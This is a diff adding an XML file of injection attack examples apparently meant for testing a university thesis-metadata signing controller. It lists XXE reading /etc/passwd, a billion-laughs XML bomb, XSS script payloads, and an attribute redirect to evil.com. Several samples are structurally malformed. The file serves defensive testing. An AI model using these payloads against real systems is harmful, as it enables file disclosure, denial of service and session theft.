@@ -1,0 +1,140 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- 
+XML INJECTION ATTACK EXAMPLES
+These examples demonstrate potential vulnerabilities if proper sanitization is not implemented.
+The current SignatureController.php uses htmlspecialchars() which provides some protection,
+but these attacks could be possible if:
+1. Data is inserted directly without sanitization
+2. Double encoding bypass occurs
+3. Database is compromised and malicious data is injected
+-->
+
+<!-- ATTACK 1: XML Entity Injection (XXE - XML External Entity) -->
+<!-- If external entity processing is enabled, this could read local files -->
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan>Test Title &xxe;</Judul_Laporan>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <Nama_Mahasiswa>John Doe</Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root>
+
+<!-- DTD Definition for XXE Attack -->
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+<!-- ATTACK 2: XML Bomb (Billion Laughs Attack) -->
+<!-- This can cause DoS by consuming excessive memory -->
+<!DOCTYPE root [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+]>
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <Judul_Laporan>&lol6;</Judul_Laporan>
+    <!-- Other elements... -->
+</root>
+
+<!-- ATTACK 3: CDATA Section Injection -->
+<!-- If CDATA processing is vulnerable, this could inject scripts -->
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan><![CDATA[Normal Title]]><script>alert('XSS')</script><![CDATA[]]></Judul_Laporan>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <Nama_Mahasiswa><![CDATA[<script>document.cookie='stolen'</script>]]></Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root>
+
+<!-- ATTACK 4: XML Structure Manipulation -->
+<!-- Attempting to break XML structure and inject additional elements -->
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan>Legitimate Title</Judul_Laporan><admin_access>true</admin_access><privilege_level>superuser</privilege_level><Judul_Laporan_EN>English Title</Judul_Laporan_EN>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <Nama_Mahasiswa>John Doe</Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root>
+
+<!-- ATTACK 5: Attribute Injection -->
+<!-- Injecting malicious attributes -->
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan onclick="alert('XSS')" onload="document.location='http://evil.com'">Malicious Title</Judul_Laporan>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <Nama_Mahasiswa class="malicious" style="display:none">Hidden Student</Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root>
+
+<!-- ATTACK 6: Comment Injection -->
+<!-- Injecting malicious comments that might be processed -->
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan>Normal Title<!-- --><script>alert('XSS')</script><!-- --></Judul_Laporan>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <!-- Injected admin credentials: admin:password123 -->
+    <Nama_Mahasiswa>John Doe</Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root>
+
+<!-- ATTACK 7: Namespace Injection -->
+<!-- Injecting malicious namespaces -->
+<root xmlns="http://umn.ac.id/thesis-metadata" 
+      xmlns:evil="http://evil.com/malicious" 
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+      xsi:schemaLocation="http://evil.com/schema.xsd">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan>Normal Title</Judul_Laporan>
+    <evil:backdoor>secret_access_code</evil:backdoor>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <Nama_Mahasiswa>John Doe</Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root>
+
+<!-- ATTACK 8: Unicode/Encoding Bypass -->
+<!-- Using different encodings to bypass filters -->
+<root xmlns="http://umn.ac.id/thesis-metadata">
+    <UUID>550e8400-e29b-41d4-a716-446655440000</UUID>
+    <Tipe_Laporan>Skripsi</Tipe_Laporan>
+    <Judul_Laporan>Normal Title&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;</Judul_Laporan>
+    <Prodi>Teknik Informatika</Prodi>
+    <Tahun>2024</Tahun>
+    <Nama_Mahasiswa>&#x4A;&#x6F;&#x68;&#x6E;&#x20;&#x44;&#x6F;&#x65;</Nama_Mahasiswa>
+    <NIM>00000000001</NIM>
+    <Dosen_Pembimbing_1__Nama>Dosen Test</Dosen_Pembimbing_1__Nama>
+    <Dosen_Pembimbing_1__NIDN>000001</Dosen_Pembimbing_1__NIDN>
+    <KAPRODI>Kaprodi Test</KAPRODI>
+</root> 
